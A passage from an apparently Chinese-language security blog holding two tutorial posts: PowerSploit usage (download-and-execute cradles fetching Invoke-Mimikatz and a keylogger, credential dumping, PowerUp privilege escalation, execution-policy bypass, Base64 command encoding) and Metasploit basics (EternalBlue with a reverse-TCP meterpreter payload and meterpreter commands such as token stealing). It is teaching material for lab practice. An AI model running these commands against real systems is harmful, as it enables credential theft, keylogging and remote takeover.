title="Invoke-Mimikatz"></a>Invoke-Mimikatz</h3><p>Invoke-Mimikatz是Exfiltration模块下的一个脚本</p><pre><code class="hljs">                    1.同样使用命令下载脚本</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-Mimikatz.ps1&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">                    下载即可                    2.执行命令</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-Mimikatz   -DumpCreds<br></code></pre></td></tr></table></figure></li></ul><h4 id="Get-Keystrokes"><a href="#Get-Keystrokes" class="headerlink" title="Get-Keystrokes:"></a>Get-Keystrokes:</h4><p>Get-Keystrokes是Exfiltration模块下的一个脚本，用于键盘记录，功能相当强大，不仅有键盘记录，甚至记录鼠标的点击情况，还能记录详细的时间，实战时可以直接放入后台运行。</p><p>同样先使用以下命令下载脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX(New-Object Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/Exfiltration/Get-Keystores.ps1&quot;</span>)<br></code></pre></td></tr></table></figure><p>使用以下命令开启键盘记录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Get-Keystrokes -LogPathc:\test1.txt<br></code></pre></td></tr></table></figure><h4 id="PowerUP攻击模块："><a href="#PowerUP攻击模块：" class="headerlink" title="PowerUP攻击模块："></a>PowerUP攻击模块：</h4><p>PowerUp是Privesc模块下的一个脚本，功能相当强大，拥有众多用来寻找目标主机windows服务漏洞进行提权的实用脚本。</p><p>加载模块：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">这里是本机所以直接导入<br>Import-Module  .\PowerUp.ps1<br><br>如要查看各个模块的详细说明，可以输入<br>get-help[cmdlet] -full<br>比如：<br>get-Help Invoke-ALLChecks   -full<br></code></pre></td></tr></table></figure><p>Invoke-ALLChecks:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">该模块会自动执行powerup下所以脚本啦检查目标主机，输出命令即可执行<br>Invoke-ALLChecks<br></code></pre></td></tr></table></figure><h4 id="Find-PathDLLHijack"><a href="#Find-PathDLLHijack" class="headerlink" title="Find-PathDLLHijack:"></a>Find-PathDLLHijack:</h4><p>该模块用于检查当前%PATH%的那些目录是用户可以写入的，输入以下命令即可执行该模块：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">Find</span>-Pathdllhijack<br></code></pre></td></tr></table></figure><h4 id="Get-RegistryAlwaysInstallElevated"><a href="#Get-RegistryAlwaysInstallElevated" class="headerlink" title="Get-RegistryAlwaysInstallElevated:"></a>Get-RegistryAlwaysInstallElevated:</h4><p>该模块用于检查AlwaysInstallElevated注册表项是否被设置，如果已被设置，意味着MSI文件以system权限运行的</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Get-RegistryAlwaysInstallElevated<br></code></pre></td></tr></table></figure><h4 id="Get-RegistryAutoLogon"><a href="#Get-RegistryAutoLogon" class="headerlink" title="Get-RegistryAutoLogon:"></a>Get-RegistryAutoLogon:</h4><p>该模块用于检查winlogin注册表的autoadminlogon项有没有被设置，可以查询默认的用户名和密码，执行该模块的命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Get-RegistryAutoLogon<br></code></pre></td></tr></table></figure><h4 id="Get-ServiceDetail"><a href="#Get-ServiceDetail" class="headerlink" title="Get-ServiceDetail:"></a>Get-ServiceDetail:</h4><p>该模块用于返回某服务的信息，输入以下命令即可执行该模块</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Get-ServiceDetail -ServiceName Dhcp                   <span class="hljs-comment">#获取DHCP服务的详细信息</span><br></code></pre></td></tr></table></figure><h4 id="Get-ServiceFilePermission"><a href="#Get-ServiceFilePermission" class="headerlink" title="Get-ServiceFilePermission:"></a>Get-ServiceFilePermission:</h4><p>该模块用于检查当前用户能够在那些服务的目录写入相关联的可执行文件，我们可以通过这些文件实现提权，输入以下命令即可执行该模块。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Get-ServiceFilePermission<br></code></pre></td></tr></table></figure><h4 id="Test-ServiceDaclPermission"><a href="#Test-ServiceDaclPermission" class="headerlink" title="Test-ServiceDaclPermission:"></a>Test-ServiceDaclPermission:</h4><p>该模块用于检查所有可用的服务，并尝试对这些打开的服务进行修改，如果可修改，则返回该服务对象：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Test-ServiceDaclPerssion<br></code></pre></td></tr></table></figure><h4 id="Invoke-ServiceAbuse"><a href="#Invoke-ServiceAbuse" class="headerlink" title="Invoke-ServiceAbuse:"></a>Invoke-ServiceAbuse:</h4><p>该模块通过修改服务来添加用户到指定组，并可以通过设置-cmd参数触发添加用户的自定义命令，执行该模块的命令。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-ServiceAbuse -ServiceName VulnSVC    <span class="hljs-comment">#添加默认账号</span><br>Invoke-ServiceAbuse -ServiceName VulnSVC   -UserName <span class="hljs-string">&quot;Test\john&quot;</span>     <span class="hljs-comment">#指定添加的域账户</span><br>Invoke-ServiceAbuse -ServiceName VulnSVC   -UserName <span class="hljs-built_in">test</span>  -Password  password  -LocalGroup  <span class="hljs-string">&quot;Administrators&quot;</span>     <span class="hljs-comment">#指定添加用户，用户密码以及添加的用户组</span><br>Invoke-ServiceAbuse -ServiceName VulnSVC   -Command <span class="hljs-string">&quot;net .......&quot;</span>         <span class="hljs-comment">#自定义执行命令</span><br></code></pre></td></tr></table></figure><h4 id="PowerUp攻击模块实战演练："><a href="#PowerUp攻击模块实战演练：" class="headerlink" title="PowerUp攻击模块实战演练："></a>PowerUp攻击模块实战演练：</h4><p>先加载PowerUp脚本，然后执行Invoke-ALLChecks，脚本将进行所有的检查</p><p>将powerup脚本上传至目标服务器，再从本地执行该脚本</p><p>使用IEX再内存中加载此脚本，执行以下命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">PowerShell.exe  -<span class="hljs-built_in">exec</span> bypass <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;C:\PowerUp.ps1&#x27;);Invoke-ALLChecks&quot;</span><br></code></pre></td></tr></table></figure><p>也可以再CMD环境下使用命令绕过执行该脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">powershell.exe  -<span class="hljs-built_in">exec</span> bypass -Command  <span class="hljs-string">&quot;&amp;&#123;Import-Module  .\PowerUp.ps1;  Invoke-ALLChecks&#125;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="使用Base64编码对Powershell命令进行编码"><a href="#使用Base64编码对Powershell命令进行编码" class="headerlink" title="使用Base64编码对Powershell命令进行编码"></a>使用Base64编码对Powershell命令进行编码</h2><p>使用ps_encoder.py脚本加密（<a href="https://github.com/h4sh5/ps_encoder%EF%BC%89">https://github.com/h4sh5/ps_encoder）</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">./ps_encoder.py <span class="hljs-literal">-s</span> script.txt<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240108105015813.png" alt="image-20240108105015813"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-encodedCommand</span> YwBhAGwAYwAuAGUAeABlAAoA<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240108105039366.png" alt="image-20240108105039366"></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>powershell基础知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>msf使用基础</title>
    <link href="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/"/>
    <url>/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="使用介绍"><a href="#使用介绍" class="headerlink" title="使用介绍"></a>使用介绍</h1><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><p>metasploit程序需要使用postgresql数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">手动启动数据库：<br><br>service postgresql start<br><br>设置成开机启动数据库：<br><br>systemctl <span class="hljs-built_in">enable</span> postgresql<br></code></pre></td></tr></table></figure><h5 id="1-1基础命令"><a href="#1-1基础命令" class="headerlink" title="1.1基础命令"></a>1.1基础命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole    <span class="hljs-comment">#进入框架</span><br>search  ms17_010                                    <span class="hljs-comment"># 使用search命令查找相关漏洞</span><br>use exploit/windows/smb/ms17_010_eternalblue        <span class="hljs-comment"># 使用use进入模块</span><br>info         <span class="hljs-comment">#使用info查看模块信息</span><br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp    <span class="hljs-comment">#设置攻击载荷</span><br>show options    <span class="hljs-comment">#查看模块需要配置的参数</span><br><span class="hljs-built_in">set</span>  RHOST  192.168.100.158        <span class="hljs-comment">#设置参数</span><br>exploit / run         <span class="hljs-comment">#攻击</span><br>后渗透阶段<span class="hljs-comment">#后渗透阶段</span><br></code></pre></td></tr></table></figure><p><strong>1.2查找模块</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">search 模块名<br>//比如我要找永恒之蓝 search ms17_010<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183155173.png" alt="image-20240107183155173"><br>使用那个模块 use 模块名或use 前面的数字都可以<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183209746.png" alt="image-20240107183209746"><br><strong>1.3使用模块</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看要设置的参数</span><br>show options<br><span class="hljs-comment">#查看模块详情</span><br>info<br><span class="hljs-comment">#设置载荷  有很多可以自行选择</span><br> <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183222015.png" alt="image-20240107183222015"><br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183237763.png" alt="image-20240107183237763"><br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183249768.png" alt="image-20240107183249768"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#运行模块</span><br>run 或者 exploit<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183300439.png" alt="image-20240107183300439"><br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183309747.png" alt="image-20240107183309747"><br><strong>1.4命令行模式的一些基础操作</strong><br>输入help可以查看支持的操作，但是乱码了，莫慌，可以解决。<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183321088.png" alt="image-20240107183321088"><br>输入 chcp 65001<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183330992.png" alt="image-20240107183330992"><br>乱码没有了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">核心后台脚本：<br><br>bgkill       关闭一个后台的meterpreter脚本<br><br>bglist   列出所有正在运行的后台脚本<br><br>bgrun   将一个meterpreter脚本以后台线程模式运行<br><br>channel   显示或者控制一个活动频道<br><br>close 关闭一个频道<br><br><span class="hljs-built_in">exit</span>终止meterpreter会话<br><br>get_timeouts获得当前会话的<span class="hljs-built_in">timeout</span>值<br><br>getuid查看当前权限<br><br><span class="hljs-built_in">help</span>帮助菜单<br><br>info 显示post模块信息<br><br>irb进入ruby脚本模式<br><br>load加载meterpreter扩展<br><br>migrate   将会话迁移到一个指定PID的进程<br><br>quit 结束meterpreter会话<br><br><span class="hljs-built_in">read</span>从频道中读取数据<br><br>resource运行文件中的命令<br><br>run 执行一个meterpreter脚本或者post模块<br><br>sessions    快速地切换到另一个会话<br><br>background切换到后台<br><br>run checkvm  查看是否是虚拟机<br><br>steal_token 伪造身份<br><br></code></pre></td></tr></table></figure><p>伪造身份：<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183353523.png" alt="image-20240107183353523"></p><h4 id="正反向载荷"><a href="#正反向载荷" class="headerlink" title="正反向载荷"></a>正反向载荷</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">windows/meterpreter/bind_tcp       <span class="hljs-comment">#正向连接</span><br>windows/meterpreter/reverse_tcp    <span class="hljs-comment">#反向连接，常用</span><br>windows/meterpreter/reverse_http   <span class="hljs-comment">#通过监听80端口反向连接</span><br>windows/meterpreter/reverse_https  <span class="hljs-comment">#通过监听443端口反向连接</span><br></code></pre></td></tr></table></figure><h6 id="正向连接使用场景："><a href="#正向连接使用场景：" class="headerlink" title="正向连接使用场景："></a>正向连接使用场景：</h6><p>  我们的攻击机在内网环境，被攻击机是外网环境，由于被攻击机无法主动连接到我们的主机，所以就必须我们主动连接被攻击机了。但是这里经常遇到的问题是，被攻击机上开了防火墙，只允许访问指定的端口，比如被攻击机只对外开放了80端口。那么，我们就只能设置正向连接80端口了，这里很有可能失败，因为80端口上的流量太多了。</p><h6 id="反向连接使用场景："><a href="#反向连接使用场景：" class="headerlink" title="反向连接使用场景："></a><strong><code>反向连接使用场景</code>：</strong></h6><p>  我们的主机和被攻击机都是在外网或者都是在内网，这样被攻击机就能主动连接到我们的主机了。如果是这样的情况，建议使用反向连接，因为反向连接的话，即使被攻击机开了防火墙也没事，防火墙只是阻止进入被攻击机的流量，而不会阻止被攻击机主动向外连接的流量。</p><h4 id="各个模块"><a href="#各个模块" class="headerlink" title="各个模块"></a>各个模块</h4><ul><li><h6 id="辅助模块-Auxiliary"><a href="#辅助模块-Auxiliary" class="headerlink" title="辅助模块(Auxiliary)"></a>辅助模块(Auxiliary)</h6><p>1、使用smb_ms17_010漏洞探测模块对smb_ms17_010漏洞进行探测：<br>命令: 可以 search auxiliary看有哪些模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_ms17_010<br></code></pre></td></tr></table></figure><p>2、查看这个模块需要配置的信息：<br>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">show options  <span class="hljs-comment">#查看这个模块需要配置的信息</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107204941011.png" alt="image-20240107204941011"></p><p>3、设置要探测的远程目标：</p><p>注：RHOSTS 参数是要探测主机的ip或ip范围，我们探测一个ip范围内的主机是否存在漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> rhosts 192.168.100.100-192.168.100.190<br></code></pre></td></tr></table></figure></li><li><h6 id="攻击模块-exploit"><a href="#攻击模块-exploit" class="headerlink" title="攻击模块(exploit)"></a>攻击模块(exploit)</h6><p>1.使用某个攻击模块</p><p>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205127130.png" alt="image-20240107205127130"></p><p>2.查看这个漏洞的信息：<br>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">info<br></code></pre></td></tr></table></figure><p>3、查看可攻击的系统平台，显示当前攻击模块针对哪些特定操作系统版本、语言版本的系统：<br>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">show target<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205257010.png" alt="image-20240107205257010"></p></li><li><h6 id="Payload攻击载荷模块"><a href="#Payload攻击载荷模块" class="headerlink" title="Payload攻击载荷模块"></a>Payload攻击载荷模块</h6><p>攻击载荷是我们期望在目标系统在被渗透攻击之后完成的实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令。</p><p>1、查看攻击载荷：<br>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">show  payloads  <span class="hljs-comment">#该命令可以查看当前漏洞利用模块下可用的所有Payload</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205338130.png" alt="image-20240107205338130"></p><p>2、设置攻击载荷：<br>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205406374.png" alt="image-20240107205406374"></p><p>3、查看模块需要配置的参数：<br>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">show  options<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205441581.png" alt="image-20240107205441581"></p><p>4、设置攻击载荷参数：<br>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> RHOST 192.168.100.158   <span class="hljs-comment">#设置RHOST，也就是要攻击主机的ip</span><br><span class="hljs-built_in">set</span> LHOST 192.168.100.132   <span class="hljs-comment">#设置LHOST，也就是我们主机的ip，用于接收从目标机弹回来的shell</span><br><span class="hljs-built_in">set</span> lport 6666              <span class="hljs-comment">#设置lport，也就是我们主机的端口，反弹shell到这个端口；如果我们这里不设置lport的话，默认是4444端口监听；</span><br></code></pre></td></tr></table></figure><p>5、进行攻击：</p><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205520019.png" alt="image-20240107205520019"></p></li><li><h6 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h6><p>运行了<code>exploit命令</code>之后，我们开启了一个<code>reverse TCP监听器</code>来监听本地的<code>6666</code>端口，即我（攻击者）的本地主机地址（LHOST）和端口号（LPORT）。运行成功之后，我们将会看到命令提示符 <code>meterpreter &gt;</code> 出现：</p><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205700145.png" alt="image-20240107205700145"></p><p>Meterpreter的命令用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><code class="hljs bash">Meterpreter &gt; ?<br>==========================================<br>核心命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>?                             帮助菜单<br>background                    把当前会话挂到后台运行<br><span class="hljs-built_in">bg</span>                            background命令的别名<br>bgkill                        杀死后台meterpreter 脚本<br>bglist                        列出正在运行的后台脚本<br>bgrun                         执行一个meterpreter脚本作为后台线程<br>channel                       显示信息或控制活动频道<br>close                         关闭一个频道<br>detach                        分离Meterpreter会话（用于 http/https）<br>disable_unicode_encoding      禁用 unicode 字符串的编码<br>enable_unicode_encoding       启用 unicode 字符串的编码<br><span class="hljs-built_in">exit</span>                          终止 Meterpreter 会话<br>get_timeouts                  获取当前会话超时值<br>guid                          获取会话 GUID<br><span class="hljs-built_in">help</span>                          帮助菜单<br>info                          显示有关 Post 模块的信息<br>irb                           在当前会话中打开一个交互式 Ruby shell<br>load                          加载一个或多个 Meterpreter 扩展<br>machine_id                    获取连接到会话的机器的 MSF ID<br>migrate                       将服务器迁移到另一个进程<br>pivot                         管理枢轴侦听器<br>pry                           在当前会话上打开 Pry 调试器<br>quit                          终止 Meterpreter 会话<br><span class="hljs-built_in">read</span>                          从通道读取数据<br>resource                      运行存储在文件中的命令<br>run                           执行一个 Meterpreter 脚本或 Post 模块<br>secure                       